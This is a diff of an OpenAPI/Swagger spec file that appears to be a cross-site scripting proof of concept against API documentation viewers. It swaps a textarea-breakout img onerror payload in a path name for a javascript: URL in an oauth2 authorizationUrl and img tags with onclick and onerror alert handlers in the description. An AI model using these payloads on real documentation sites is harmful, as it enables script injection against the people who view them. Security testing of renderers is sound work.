@@ -1,11 +1,15 @@
-openapi: 3.0.1
+swagger: '2.0'
+securityDefinitions:
+  a:
+    type: oauth2
+    authorizationUrl: javascript:alert(document.domain)//
 info:
-  title: Test
-  version: 1.0
+  version: "1.0.0"
+  title: XSS img test
+  description: onload="alert(1)" <img src=https://academy.avast.com/hubfs/New_Avast_Academy/Hackers/Hacker-Hero-a1.png onclick="alert(2)" onerror="alert(3)">
 paths:
-  "/test</textarea><img src=1 onerror=alert('XSS')>":
+  /:
     get:
-      summary: "XSS PoC"
       responses:
-        '200':
-          description: OK
+        200:
+          description: Successful response
